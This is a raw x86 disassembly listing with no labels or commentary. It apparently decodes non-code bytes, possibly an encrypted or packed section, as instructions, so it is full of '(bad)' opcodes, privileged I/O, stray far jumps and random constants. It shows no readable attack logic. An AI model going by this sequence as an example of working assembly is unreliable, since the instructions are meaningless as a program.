  404a2e:	push   ebp
  404a2f:	pop    es
  404a30:	scas   al,BYTE PTR es:[edi]
  404a31:	shl    bh,1
  404a33:	mov    edx,esp
  404a35:	dec    edi
  404a36:	adc    al,0xdb
  404a38:	and    ebp,eax
  404a3a:	pusha  
  404a3b:	in     al,dx
  404a3c:	loopne 0x404ab4
  404a3e:	ror    BYTE PTR [ecx],1
  404a40:	mov    ebp,0x6e00cc4d
  404a45:	dec    edi
  404a46:	push   0xe9e54faa
  404a4b:	add    esp,0x3a14c47
  404a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a52:	sbb    DWORD PTR [edx+0x16],0xa9216fbc
  404a59:	pop    esi
  404a5a:	sar    BYTE PTR [ebx+0x4a],1
  404a5d:	sbb    BYTE PTR [edi-0x38249f40],cl
  404a63:	jo     0x404a34
  404a65:	xor    BYTE PTR [ebx-0x55],bl
  404a68:	out    dx,eax
  404a69:	jae    0x404ad5
  404a6b:	jmp    0x4049fc
  404a6d:	rol    BYTE PTR [edi],cl
  404a6f:	cmp    ebx,DWORD PTR [ecx+0x5]
  404a72:	mov    al,ds:0x6efc7362
  404a77:	lea    esi,[ebx+0x26256c5c]
  404a7d:	(bad)  
  404a7e:	mov    ecx,0xaed8c0a2
  404a83:	sahf   
  404a84:	js     0x404af9
  404a86:	gs jno 0x404a65
  404a89:	and    eax,0x91ec6022
  404a8e:	pusha  
  404a8f:	fldcw  WORD PTR [ecx+0x41]
  404a92:	dec    eax
  404a93:	pop    edx
  404a94:	jecxz  0x404a4f
  404a96:	pop    ss
  404a97:	fld    DWORD PTR [ebp+0x3ba3eaf3]
  404a9d:	jge    0x404adc
  404a9f:	daa    
  404aa0:	cmp    eax,DWORD PTR [esi+eiz*1-0xc]
  404aa4:	sbb    al,BYTE PTR [ebp+0x5232beb7]
  404aaa:	test   DWORD PTR [edi-0x28b6fa0e],edx
  404ab0:	push   0x170b6afd
  404ab5:	cli    
  404ab6:	sar    DWORD PTR [bx-0x3c82],1
  404abb:	mov    cl,0x34
  404abd:	add    al,dl
  404abf:	or     BYTE PTR [edi+0x4e14a77f],bh
  404ac5:	rcr    DWORD PTR [edx+0x6cbb0aa3],cl
  404acb:	mov    edx,0x262e9476
  404ad0:	sbb    dl,BYTE PTR [edi-0x1c837f7a]
  404ad6:	or     BYTE PTR [esi-0x106b3237],0xec
  404add:	jmp    0xd142:0x3bc4baa
  404ae4:	jge    0x404ac8
  404ae6:	cmp    BYTE PTR [ebx],cl
  404ae8:	repz enter 0xed75,0x35
  404aed:	dec    ebp
  404aee:	mov    bl,0x89
  404af0:	in     eax,dx
  404af1:	mov    dh,BYTE PTR [ebx-0x22]
  404af4:	or     eax,0xa7ee1d61
  404af9:	test   ch,dh
  404afb:	mov    ds:0xf2a27d7f,eax
  404b00:	xchg   esi,eax
  404b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b02:	mov    DWORD PTR ds:0x93dcad3a,edi
  404b08:	or     al,0x9f
  404b0a:	xlat   BYTE PTR ds:[ebx]
  404b0b:	push   ecx
  404b0c:	test   eax,0x1ef8320f
  404b11:	out    0x10,al
  404b13:	sub    ebp,DWORD PTR [ebp+0x32]
  404b16:	mov    WORD PTR [eax+0x393ed9e9],cs
  404b1c:	pop    ebx
  404b1d:	stos   DWORD PTR es:[edi],eax
  404b1e:	call   0xff79:0x6e8758d1
  404b25:	std    
  404b26:	pop    ebp
  404b27:	jae    0x404b64
  404b29:	fwait
  404b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b2b:	mov    bl,0xf1
  404b2d:	fld    DWORD PTR ds:[ebx-0x2c]
  404b31:	(bad)  
  404b32:	fimul  WORD PTR [esi+0x43b50eb7]
  404b38:	icebp  
  404b39:	test   BYTE PTR [ebp+0x4175719e],0x6a
  404b40:	popf   
  404b41:	pop    edi
  404b42:	inc    esp
  404b43:	xor    eax,ecx
  404b45:	push   ss
  404b46:	addr16 sub eax,0x7f8ceb27
  404b4c:	loopne 0x404af1
  404b4e:	add    al,0x1c
  404b50:	mov    edx,ss
  404b52:	test   eax,0x5df3f444
  404b57:	sub    BYTE PTR [ebx-0x46f2b2b6],al
  404b5d:	sub    BYTE PTR [eax+0x3a6c40d2],dh
  404b63:	or     BYTE PTR [ebx-0xdd23976],ch
  404b69:	push   DWORD PTR [ecx+ebp*1-0x38]
  404b6d:	mov    ah,0x56
  404b6f:	push   edi
  404b70:	inc    ebp
  404b71:	in     al,0x2b
  404b73:	push   esi
  404b74:	call   esp
  404b76:	aam    0xfa
  404b78:	push   eax
  404b79:	js     0x404b6b
  404b7b:	add    BYTE PTR [ebp-0x24b2779a],ch
  404b81:	jge    0x404b3f
  404b83:	pop    esi
  404b84:	mov    DWORD PTR [ecx-0x6f],eax
  404b87:	popa   
  404b88:	shr    DWORD PTR [ebx+0x17],1
  404b8b:	jbe    0x404b7c
  404b8d:	addr16 inc esp
  404b8f:	push   cs
  404b90:	iret   
  404b91:	cmp    al,0xed
  404b93:	(bad)  
  404b95:	cli    
  404b96:	xor    al,0xd2
  404b98:	lods   eax,DWORD PTR ds:[esi]
  404b99:	stc    
  404b9a:	call   0x56c7c676
  404b9f:	inc    edx
  404ba0:	mov    dh,0xa5
  404ba2:	dec    ebx
  404ba3:	icebp  
  404ba4:	mov    cl,0x70
  404ba6:	mov    eax,0xcab19d3e
  404bab:	mov    edi,0x3a5ccfce
  404bb0:	jnp    0x404c06
  404bb2:	aas    
  404bb3:	mov    dh,0xed
  404bb5:	cwde   
  404bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb7:	ret    
  404bb8:	pop    ebp
  404bb9:	jno    0x404b65
  404bbb:	inc    esp
  404bbc:	or     esp,edx
  404bbe:	mov    ch,0xe9
  404bc0:	pop    edx
  404bc1:	lods   al,BYTE PTR ds:[esi]
  404bc2:	cmp    DWORD PTR [esi-0x5a],0x3b3c7233
  404bc9:	std    
  404bca:	popa   
  404bcb:	and    al,0x41
  404bcd:	popa   
  404bce:	(bad)  
  404bcf:	loop   0x404b7d
  404bd1:	jge    0x404b66
  404bd3:	ret    0x334f
  404bd6:	sub    ebx,DWORD PTR [ebx-0x68]
  404bd9:	sub    al,0xda
  404bdb:	sbb    DWORD PTR [ebp+0x21],esi
  404bde:	mov    ch,BYTE PTR [esi]
  404be0:	push   0x67
  404be2:	neg    BYTE PTR [ecx]
  404be4:	test   eax,0x68a76cc
  404be9:	jg     0x404c31
  404beb:	lock ficom DWORD PTR fs:[edx+0x1544f36a]
  404bf3:	cmp    BYTE PTR [edi],ch
  404bf5:	shl    DWORD PTR [esi+0x6d],cl
  404bf8:	dec    esp
  404bf9:	ds ret 
  404bfb:	popa   
  404bfc:	jg     0x404bcd
  404bfe:	push   ecx
  404bff:	repz pushf 
  404c01:	xor    cl,BYTE PTR [eax-0x3c1f09d6]
  404c07:	sbb    al,0x2
  404c09:	sbb    DWORD PTR [ecx-0x6c],esi
  404c0c:	stos   BYTE PTR es:[edi],al
  404c0d:	out    dx,al
  404c0e:	jne    0x404c04
  404c10:	mul    DWORD PTR [ecx-0x361a6639]
  404c16:	sub    bh,BYTE PTR [ecx-0x45]
  404c19:	dec    ebp
  404c1a:	gs ins DWORD PTR es:[edi],dx
  404c1c:	dec    ebx
  404c1d:	xchg   esp,eax
  404c1e:	pop    esi
  404c1f:	test   BYTE PTR [ecx+0x60],cl
  404c22:	popa   
  404c23:	push   eax
  404c24:	xchg   ebx,eax
  404c25:	jbe    0x404bd8
  404c27:	ficom  DWORD PTR [ebp+0x7c69cf07]
  404c2d:	rcl    BYTE PTR [edi],cl
  404c2f:	fistp  DWORD PTR [esi]
  404c31:	nop
  404c32:	adc    eax,0xdc032c10
  404c37:	and    ecx,DWORD PTR [edi]
  404c39:	ds mov bl,0x67
  404c3c:	repz arpl WORD PTR [edi-0x5],dx
  404c40:	pop    ecx
  404c41:	add    bl,bl
  404c43:	push   edi
  404c44:	int    0xf7
  404c46:	mov    esi,0xd8828714
  404c4b:	xor    BYTE PTR [edx+0x5c],ah
  404c4e:	fidiv  WORD PTR [ecx+0x4]
  404c51:	push   es
  404c52:	aaa    
  404c53:	xlat   BYTE PTR ds:[ebx]
  404c54:	mov    ebp,0x1c14f598
  404c59:	xor    BYTE PTR [edx+ebp*4],al
  404c5c:	add    DWORD PTR [ebp+0x58f3036d],ecx
  404c62:	scas   eax,DWORD PTR es:[edi]
  404c63:	(bad)  
  404c64:	push   0x58
  404c66:	pop    esp
  404c67:	fidivr DWORD PTR [esi-0x58]
  404c6a:	pusha  
  404c6b:	icebp  
  404c6c:	mov    edi,0xf7d62666
  404c71:	or     DWORD PTR [esi],esp
  404c73:	ficom  DWORD PTR [ecx-0x2e]
  404c76:	push   esi
  404c77:	mov    bh,0xe6
  404c79:	mov    cl,0x0
  404c7b:	cli    
  404c7c:	(bad)  
  404c7d:	adc    al,0xf5
  404c7f:	mov    ah,0x31
  404c81:	mov    ?,eax
  404c83:	mov    ebx,DWORD PTR [ecx+0x54628fdf]
  404c89:	loope  0x404cbd
  404c8b:	int3   
  404c8c:	adc    DWORD PTR [edx+esi*8],0x8a25d691
  404c93:	mov    ecx,0x5a427dab
  404c98:	lods   al,BYTE PTR ds:[esi]
  404c99:	clc    
  404c9a:	xor    bh,BYTE PTR ds:0xfa1da7ad
  404ca0:	pushf  
  404ca1:	sbb    cl,BYTE PTR [ebp+0x3]
  404ca4:	mov    ebx,0xbbfa97b
  404ca9:	jae    0x404c42
  404cab:	inc    ebp
  404cac:	xchg   esi,eax
  404cad:	cwde   
  404cae:	inc    esp
  404caf:	ror    al,0x2c
  404cb2:	(bad)  
  404cb3:	jnp    0x404d12
  404cb5:	xchg   DWORD PTR [edx+0x78],eax
  404cb8:	das    
  404cb9:	cwde   
  404cba:	lods   al,BYTE PTR ds:[esi]
  404cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cbc:	daa    
  404cbd:	cdq    
  404cbe:	sub    DWORD PTR [edx-0x1f],0x7b
  404cc2:	inc    edx
  404cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc4:	div    ebx
  404cc6:	stos   DWORD PTR es:[edi],eax
  404cc7:	jp     0x404d41
  404cc9:	(bad)  
  404cca:	addr16 mov al,0x75
  404ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cce:	mov    ah,0x23
  404cd0:	ja     0x404cf5
  404cd2:	ja     0x404d2f
  404cd4:	push   es
  404cd5:	mov    ecx,0xe3e95722
  404cda:	aaa    
  404cdb:	jge    0x404c71
  404cdd:	test   al,0xd8
  404cdf:	int3   
  404ce0:	inc    esp
  404ce1:	outs   dx,DWORD PTR ds:[esi]
  404ce2:	mov    ch,BYTE PTR [eax-0x69]
  404ce5:	xchg   ecx,eax
  404ce6:	inc    ebp
  404ce7:	fwait
  404ce8:	in     eax,0x21
  404cea:	push   edx
  404ceb:	cmp    eax,0xa011eeb2
  404cf0:	test   BYTE PTR [ebx+esi*1+0x26],dl
  404cf4:	out    dx,eax
  404cf5:	or     esp,esp
  404cf7:	out    0x68,eax
  404cf9:	xchg   ebp,eax
  404cfa:	fisub  DWORD PTR [ecx+0x2fd8ba33]
  404d00:	adc    BYTE PTR [esi+0x47fd4a96],bh
  404d06:	fld    TBYTE PTR [eax+edx*4]
  404d09:	mov    ah,0x59
  404d0b:	jg     0x404d88
  404d0d:	inc    ecx
  404d0e:	pushf  
  404d0f:	jnp    0x404d87
  404d11:	sub    dh,BYTE PTR [edx-0x67506db3]
  404d17:	hlt    
  404d18:	retf   
  404d19:	sub    BYTE PTR [ebx+0x1e98fbdf],ch
  404d1f:	xchg   DWORD PTR [ebx-0xf],eax
  404d22:	(bad)
  404d25:	jp     0x404cca
  404d27:	push   es
  404d28:	pop    ebx
  404d29:	dec    ebp
  404d2a:	pop    DWORD PTR [esi+0x32]
  404d2d:	mov    bh,BYTE PTR [edi+0x2e]
  404d30:	fistp  WORD PTR [esi]
  404d32:	push   ecx
  404d33:	fnsave [esi]
  404d35:	xchg   ebx,eax
  404d36:	not    DWORD PTR [edi]
  404d38:	xchg   esp,eax
  404d39:	ins    DWORD PTR es:[edi],dx
  404d3a:	ins    DWORD PTR es:[edi],dx
  404d3b:	dec    edx
  404d3c:	std    
  404d3d:	popf   
  404d3e:	fistp  WORD PTR ds:[eax+ebp*1]
  404d42:	call   0x46d3486a
  404d47:	mov    ds,WORD PTR [esi+0x343dea90]
  404d4d:	mov    gs,WORD PTR [esi-0x61]
  404d50:	cmp    eax,0xf9d17494
  404d55:	test   al,0x3e
  404d57:	jns    0x404d69
  404d59:	mov    bl,0x45
  404d5b:	mov    dh,0x7e
  404d5d:	fstp   TBYTE PTR [eax+0x37]
  404d60:	sbb    eax,0xf950749a
  404d65:	imul   ebx,DWORD PTR [eax+eax*8+0x311c4676],0x50dcb38d
  404d70:	cmc    
  404d71:	mov    ch,0xa8
  404d73:	stos   BYTE PTR es:[edi],al
  404d74:	or     eax,0x63e3aab6
  404d79:	mov    WORD PTR [esi+0x2f6c01fd],cs
  404d7f:	sti    
  404d80:	jmp    0xde2b:0x1c6aae14
  404d87:	aas    
  404d88:	test   DWORD PTR [esi+0x36],0x17c607f1
  404d8f:	stc    
  404d90:	xchg   edx,eax
  404d91:	jno    0x404d46
  404d93:	xchg   edx,eax
  404d94:	pop    edx
  404d95:	std    
  404d96:	mov    eax,0x7825f31a
  404d9b:	mov    edx,0x9c61e98
  404da0:	les    ebx,FWORD PTR [ebp-0x7c]
  404da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da4:	push   edi
  404da5:	add    BYTE PTR [ebx+0x75],bh
  404da8:	dec    edi
  404da9:	inc    esi
  404daa:	cmp    eax,0x976a4273
  404daf:	xor    edi,ebx
  404db1:	dec    ecx
  404db2:	sub    dl,dh
  404db4:	sbb    BYTE PTR [ebx-0x1ed6421d],bh
  404dba:	stos   BYTE PTR es:[edi],al
  404dbb:	jno    0x404da4
  404dbd:	stc    
  404dbe:	adc    BYTE PTR [esi-0x11],bh
  404dc1:	aaa    
  404dc2:	push   esp
  404dc3:	push   ds
  404dc4:	inc    ebx
  404dc5:	mov    cl,0x20
  404dc7:	aas    
  404dc8:	(bad)  
  404dca:	push   ebx
  404dcb:	pop    ebx
  404dcc:	pop    eax
  404dcd:	je     0x404dc4
  404dcf:	sub    edx,DWORD PTR [edi+esi*2+0x684d1f48]
  404dd6:	xor    al,cl
  404dd8:	mov    esp,0x4fed60f9
  404ddd:	add    edx,esp
  404ddf:	sbb    al,0x3
  404de1:	pop    esp
  404de2:	cwde   
  404de3:	mov    bh,0x3c
  404de5:	add    al,0x56
  404de7:	nop
  404de8:	shl    esp,0x32
  404deb:	sbb    edi,ecx
  404ded:	mov    ch,0xf9
  404def:	(bad)  
  404df0:	loope  0x404e69
  404df2:	gs pop eax
  404df4:	out    dx,eax
  404df5:	in     eax,0xa4
  404df7:	pop    ebx
  404df8:	sbb    DWORD PTR [eax],eax
  404dfa:	les    ecx,FWORD PTR [bx+si]
  404dfd:	sar    BYTE PTR cs:[edi],0xb
  404e01:	sbb    DWORD PTR [ebx],0x1943fd64
  404e07:	jne    0x404e00
  404e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e0a:	(bad)  
  404e0b:	cmp    eax,0x9958743a
  404e10:	mov    bh,0xac
  404e12:	sbb    edx,DWORD PTR [ebp-0x62]
  404e15:	fsubr  DWORD PTR [esi-0x12a02731]
  404e1b:	ins    DWORD PTR es:[edi],dx
  404e1c:	dec    esi
  404e1d:	add    bh,BYTE PTR [ebx]
  404e1f:	jno    0x404e23
  404e21:	mov    ds:0xa8d7316a,eax
  404e26:	sbb    DWORD PTR [ebx+0x7213de74],eax
  404e2c:	mov    edi,0x45d93122
  404e31:	out    dx,eax
  404e32:	in     al,dx
  404e33:	pop    esp
  404e34:	jae    0x404e52
  404e36:	fwait
  404e37:	rcr    BYTE PTR [edx+0x6c9c6093],1
  404e3d:	ficom  DWORD PTR ds:0x5e0f544b
  404e43:	dec    esi
  404e44:	aam    0xf
  404e46:	lods   al,BYTE PTR ds:[esi]
  404e47:	fwait
  404e48:	es (bad) 
  404e4c:	fs mov al,0x7
  404e4f:	ins    BYTE PTR es:[edi],dx
  404e50:	dec    ebx
  404e51:	jno    0x404ec1
  404e53:	dec    esp
  404e54:	retf   
  404e55:	call   0x128d:0xa1a2fdec
  404e5c:	(bad)  
  404e5d:	jl     0x404e8e
  404e5f:	inc    ecx
  404e60:	jmp    0x5e7cc651
  404e65:	mov    esp,0xd9154de4
  404e6a:	dec    esi
  404e6b:	retf   
  404e6c:	outs   dx,BYTE PTR ds:[esi]
  404e6d:	cmp    al,0x13
  404e6f:	adc    eax,0xf9a64828
  404e74:	xchg   edx,eax
  404e75:	mov    bl,0x69
  404e77:	mul    DWORD PTR [ebx+0x7c]
  404e7a:	mov    ds:0xbe205130,eax
  404e7f:	scas   al,BYTE PTR es:[edi]
  404e80:	test   eax,0x1260d941
  404e85:	mov    ds:0xefe48d34,eax
  404e8a:	out    0x75,al
  404e8c:	out    dx,eax
  404e8d:	add    DWORD PTR [ecx-0x5b1d1830],edx
  404e93:	fidiv  WORD PTR [ecx+0x22b0a688]
  404e99:	push   cs
  404e9a:	mov    ds:0x3f797e45,eax
  404e9f:	and    DWORD PTR [edi-0x2d],eax
  404ea2:	mov    esi,0x12975b30
  404ea7:	mov    fs,esi
  404ea9:	gs jae 0x404ec5
  404eac:	nop
  404ead:	sbb    al,0x86
  404eaf:	sbb    BYTE PTR [esi],bl
  404eb1:	pop    edi
  404eb2:	jmp    0x404e8d
  404eb4:	shr    BYTE PTR [ecx+edi*1-0x72],1
  404eb8:	fs scas eax,DWORD PTR es:[edi]
  404eba:	jnp    0x404f37
  404ebc:	sub    DWORD PTR [eax+edx*4-0x18429f76],0xffffffd8
  404ec4:	sub    eax,0xfa4ebca4
  404ec9:	fucomp st(6)
  404ecb:	inc    edx
  404ecc:	outs   dx,BYTE PTR ds:[esi]
  404ecd:	adc    eax,0xe082b8fa
  404ed2:	adc    BYTE PTR [esi-0xc],0xf7
  404ed6:	pop    edx
  404ed7:	pop    edx
  404ed8:	push   ecx
  404ed9:	dec    ebp
  404eda:	mov    bl,0xa3
  404edc:	int    0x62
  404ede:	add    eax,0x3f6299e0
  404ee3:	mov    eax,0x6df539e1
  404ee8:	arpl   WORD PTR [esi+0x339e6c14],bx
  404eee:	scas   eax,DWORD PTR es:[edi]
  404eef:	pop    ebx
  404ef0:	enter  0xa93d,0xb0
  404ef4:	push   ebp
  404ef5:	xor    eax,0x96715df2
  404efa:	cs pusha 
  404efc:	int    0x69
  404efe:	xchg   esi,eax
  404eff:	imul   edi,DWORD PTR [esi],0x661a82b0
  404f05:	or     edx,DWORD PTR [esi-0x78217cb]
  404f0b:	lea    edx,ds:0x4b4a1299
  404f11:	mov    esp,edx
  404f13:	jmp    DWORD PTR [bx+si+0x4e0a]
  404f18:	push   ecx
  404f19:	push   esp
  404f1a:	sub    BYTE PTR [edx],bh
  404f1c:	fisttp QWORD PTR [eax-0x3e66c854]
  404f22:	fyl2x  
  404f24:	stos   DWORD PTR es:[edi],eax
  404f25:	or     al,0xdb
  404f27:	hlt    
  404f28:	cmp    esi,edi
  404f2a:	in     al,dx
  404f2b:	sbb    DWORD PTR [edx+0x609d2cd7],ebx
  404f31:	lock or al,0x82
  404f34:	xor    BYTE PTR ds:0xf0c130d2,dl
  404f3a:	xor    edi,DWORD PTR [ebx+0x42]
  404f3d:	xor    ecx,esi
  404f3f:	lock pop ds
  404f41:	(bad)  
  404f42:	fucomi st,st(4)
  404f44:	jmp    0x53b794b5
  404f49:	push   edi
  404f4a:	ins    DWORD PTR es:[edi],dx
  404f4b:	ins    DWORD PTR es:[edi],dx
  404f4c:	fisttp DWORD PTR [eax+0x93bde3c]
  404f52:	cmp    eax,ecx
  404f54:	iret   
  404f55:	push   ds
  404f56:	inc    esp
  404f57:	add    dl,BYTE PTR [edi]
  404f59:	jb     0x404f90
  404f5b:	outs   dx,DWORD PTR ds:[esi]
  404f5c:	mov    eax,0x6233f03b
  404f61:	mov    ds:0x7b9c93d2,al
  404f66:	fstp   st(0)
  404f68:	cmp    bh,ah
  404f6a:	inc    edx
  404f6b:	loop   0x404f87
  404f6d:	mov    al,0x1b
  404f6f:	inc    eax
  404f70:	add    al,0x8b
  404f72:	mov    esi,0xf5895a7c
  404f77:	es in  eax,dx
  404f79:	loope  0x404f41
  404f7b:	sahf   
  404f7c:	je     0x404fac
  404f7e:	push   ss
  404f7f:	xor    dl,BYTE PTR [ebx+edi*4-0x5d]
  404f83:	or     al,0x6f
  404f85:	vpcmpeqd ymm3,ymm4,YMMWORD PTR [edx+0x29]
  404f8a:	out    0xca,eax
  404f8c:	pop    eax
  404f8d:	sti    
  404f8e:	jbe    0x404f79
  404f90:	pop    ecx
  404f91:	movzx  esp,WORD PTR ds:0xa5023e2c
  404f98:	or     ebp,ebp
  404f9a:	mov    edi,0x54afa64c
  404f9f:	cmp    ecx,ecx
  404fa1:	(bad)  
  404fa2:	pop    ss
  404fa3:	sub    al,0x9e
  404fa5:	(bad)  
  404fa6:	pop    eax
  404fa8:	jmp    0x130d9a66
  404fad:	xlat   BYTE PTR ds:[ebx]
  404fae:	dec    ebx
  404faf:	enter  0xf6bb,0x3e
  404fb3:	jne    0x404f66
  404fb5:	fwait
  404fb6:	jno    0x404f56
  404fb8:	sbb    DWORD PTR [edi],eax
  404fba:	inc    esi
  404fbb:	(bad)  
  404fbd:	retfw  
  404fbf:	pop    eax
  404fc0:	or     al,ah
  404fc2:	rcr    ecx,cl
  404fc4:	pop    DWORD PTR [edx+0x200d88c3]
  404fca:	repnz mov bh,0xae
  404fcd:	inc    ecx
  404fce:	add    DWORD PTR ds:0xef4fdef9,ebp
  404fd4:	and    eax,0x501dcb57
  404fd9:	popa   
  404fda:	fcom   QWORD PTR [eax]
  404fdc:	mov    dl,0x7a
  404fde:	dec    ecx
  404fdf:	cdq    
  404fe0:	pop    esp
  404fe1:	pop    ds
  404fe2:	icebp  
  404fe3:	aam    0x8
  404fe5:	test   DWORD PTR [ecx],esp
  404fe7:	push   eax
  404fe8:	pushf  
  404fe9:	ja     0x405013
  404feb:	out    dx,al
  404fec:	fst    DWORD PTR [esi+0x1f]
  404fef:	inc    eax
  404ff0:	sub    DWORD PTR [eax+0x75],0xffffff80
  404ff4:	ret    0x3fe4
  404ff7:	pop    ecx
  404ff8:	jecxz  0x405061
  404ffa:	adc    DWORD PTR ds:0xc01aa485,edx
  405000:	push   DWORD PTR [ecx]
  405002:	sub    al,0xe1
  405004:	mov    ds:0xa0d121b4,al
  405009:	jb     0x405052
  40500b:	cwde   
  40500c:	bound  edi,QWORD PTR [edx+0x35429e2e]
  405012:	lds    edi,FWORD PTR [ecx]
  405014:	fdivr  st,st(6)
  405016:	mov    DWORD PTR [esi+ecx*1],ecx
  405019:	mov    ch,bl
  40501b:	jb     0x405029
  40501d:	imul   edx,DWORD PTR [esi+ecx*8],0xd53f6e70
  405024:	mov    bh,0x9c
  405026:	imul   ebx,DWORD PTR [ebp+0x4a],0x9a8464e6
  40502d:	les    ecx,FWORD PTR [esi+0x3c449f65]
  405033:	mov    cl,0x72
  405035:	(bad)  
  405036:	arpl   WORD PTR [ebp-0x2c125af9],di
  40503c:	inc    esi
  40503d:	mov    WORD PTR [eax-0x7b545383],?
  405043:	xchg   ebx,eax
  405044:	aas    
  405045:	pushf  
  405046:	lahf   
  405047:	fucom  st(0)
  405049:	in     eax,0x81
  40504b:	mov    cl,0xf9
  40504d:	cmc    
  40504e:	fwait
  40504f:	push   eax
  405050:	adc    ch,ah
  405052:	loop   0x40500c
  405054:	test   eax,0x72bd684c
  405059:	lods   al,BYTE PTR ds:[esi]
  40505a:	pop    ds
  40505b:	sub    BYTE PTR [ecx-0x2b],ah
  40505e:	pmullw xmm7,XMMWORD PTR [ebx-0x21]
  405063:	fisttp QWORD PTR [ebx+0x72]
  405066:	leave  
  405067:	enter  0x61cd,0xfa
  40506b:	xchg   BYTE PTR [ebp+eax*8-0xe47aaa],bl
  405072:	int3   
  405073:	ret    
  405074:	clc    
  405075:	dec    ebp
  405076:	mov    ebx,0x339606bf
  40507b:	repnz sti 
  40507d:	fwait
  40507e:	jmp    0x2fd3df1b
  405083:	push   0xffffffda
  405085:	dec    eax
  405086:	out    0xd5,eax
  405088:	(bad)  
  405089:	cmp    al,0xd
  40508b:	jp     0x4050ba
  40508d:	xor    bh,BYTE PTR [esp+edx*8+0x4]
  405091:	and    eax,0xa351f508
  405096:	cmp    dl,BYTE PTR [edx]
  405098:	fnstcw WORD PTR [eax+0x35]
  40509b:	jne    0x4050a3
  40509d:	jmp    0x4050a2
  40509f:	into   
  4050a0:	repz xor eax,0x26ffbca1
  4050a6:	fimul  WORD PTR [edx+0x3c319a4e]
  4050ac:	adc    ah,BYTE PTR [esi+0x73]
  4050af:	imul   esi,DWORD PTR [eax+0x3f80fb5b],0xa290dba8
  4050b9:	jecxz  0x4050a0
  4050bb:	xor    al,BYTE PTR [ebp+0xe]
  4050be:	push   ecx
  4050bf:	inc    edx
  4050c0:	sbb    ch,BYTE PTR [ebp+eiz*2-0x372be3b3]
  4050c7:	sub    eax,esi
  4050c9:	pop    ds
  4050ca:	cmp    eax,0x3273a68
  4050cf:	fs out dx,al
  4050d1:	cmp    edi,0x21
  4050d4:	mov    ds:0xb8e5e51e,al
  4050d9:	dec    esi
  4050da:	jp     0x4050f8
  4050dc:	jb     0x405071
  4050de:	mov    ?,ebx
  4050e0:	das    
  4050e1:	sbb    dh,BYTE PTR [edx-0x7d]
  4050e4:	push   ds
  4050e5:	imul   bh
  4050e7:	inc    ecx
  4050e8:	aad    0xa3
  4050ea:	es jp  0x40515a
  4050ed:	int    0xfd
  4050ef:	lods   eax,DWORD PTR ds:[esi]
  4050f0:	push   0x4fba49e3
  4050f5:	cmp    DWORD PTR [ebx],esi
  4050f7:	fs pop ss
  4050f9:	inc    ecx
  4050fa:	mov    ebp,0xa898e623
  4050ff:	sbb    ecx,esp
  405101:	(bad)  
  405102:	cli    
  405103:	je     0x4050ba
  405105:	or     ecx,DWORD PTR [edx-0x51]
  405108:	repnz ds or eax,0xe031ed22
  40510f:	lahf   
  405110:	xchg   bx,ax
  405112:	(bad)  
  405113:	cmp    al,BYTE PTR [ecx-0x77]
  405116:	(bad)  
  405117:	xor    ah,ah
  405119:	sti    
  40511a:	in     eax,0xfd
  40511c:	lea    eax,[ebp+0x7a]
  40511f:	mov    bl,0x84
  405121:	ins    BYTE PTR es:[edi],dx
  405122:	shl    BYTE PTR [esp+edi*1-0x62],1
  405126:	jmp    0x84b8fbd9
  40512b:	shl    esp,1
  40512d:	cmp    BYTE PTR [ecx],dh
  40512f:	ffree  st(3)
  405131:	lds    esp,FWORD PTR [edi-0x5d556797]
  405137:	jle    0x4050c1
  405139:	xchg   edi,eax
  40513a:	adc    BYTE PTR [esi-0x1f],ah
  40513d:	(bad)  
  40513e:	jmp    0x40513e
  405140:	mov    dl,0xcd
  405142:	pop    es
  405143:	push   ebp
  405144:	xchg   ebx,eax
  405145:	sbb    ecx,DWORD PTR [ecx-0x3de06793]
  40514b:	and    DWORD PTR [esi+0x71],ecx
  40514e:	adc    eax,0x95d62e52
  405153:	mov    ds:0x3319ba8,eax
  405158:	and    eax,0x44a6769d
  40515d:	ja     0x4051d9
  40515f:	loop   0x4051c3
  405161:	fcmovnbe st,st(2)
  405163:	aas    
  405164:	xor    dl,BYTE PTR [edx]
  405166:	mov    ebp,0x473aaf7
  40516b:	push   ecx
  40516c:	imul   eax,DWORD PTR [esi+0x760d0fa4],0xffffff8b
  405173:	lods   eax,DWORD PTR ds:[esi]
  405174:	or     al,0xb0
  405176:	and    eax,0x33810064
  40517b:	fld    TBYTE PTR [eax+0x2d]
  40517e:	mov    al,ds:0x22505d06
  405183:	ja     0x405188
  405185:	pop    esp
  405186:	or     ah,BYTE PTR [ebx-0x173a6e20]
  40518c:	dec    ecx
  40518d:	iret   
  40518e:	dec    esi
  40518f:	shl    BYTE PTR [ebx],1
  405191:	push   0xa6a0c02d
  405196:	sbb    ebp,DWORD PTR [edi+0x7a5608a2]
  40519c:	outs   dx,BYTE PTR ds:[esi]
  40519d:	pusha  
  40519e:	lahf   
  40519f:	xor    al,0x8d
  4051a1:	mov    ds:0x11b1a522,al
  4051a6:	fcom   DWORD PTR [ecx-0xb]
  4051a9:	mov    ds:0x3bcf78dc,eax
  4051ae:	rcr    DWORD PTR [ecx],1
  4051b0:	inc    edi
  4051b1:	push   eax
  4051b2:	adc    al,0x9
  4051b4:	adc    dl,BYTE PTR [eax*4-0x76d2ce27]
  4051bb:	pop    ss
  4051bc:	aaa    
  4051bd:	mov    ecx,0xe78aff69
  4051c2:	gs sub eax,0x90ed6689
  4051c8:	sub    bh,BYTE PTR [edx-0x2e]
  4051cb:	push   ds
  4051cc:	pop    edx
  4051cd:	sub    eax,0xff1dcb13
  4051d2:	xor    edx,esp
  4051d4:	cld    
  4051d5:	inc    ecx
  4051d6:	push   esp
  4051d7:	mov    ds:0xd17a0433,al
  4051dc:	add    BYTE PTR [edi+0x2c],dh
  4051df:	fild   DWORD PTR [edi+0x25]
  4051e2:	cmc    
  4051e3:	pop    ecx
  4051e4:	in     al,0x6d
  4051e6:	or     al,ch
  4051e8:	ss jle 0x4051e5
  4051eb:	xor    eax,0xd74360b2
  4051f0:	(bad)  
  4051f1:	repz mov eax,ds:0xa19c0ce
  4051f7:	dec    ecx
  4051f8:	cdq    
  4051f9:	mov    bh,0x82
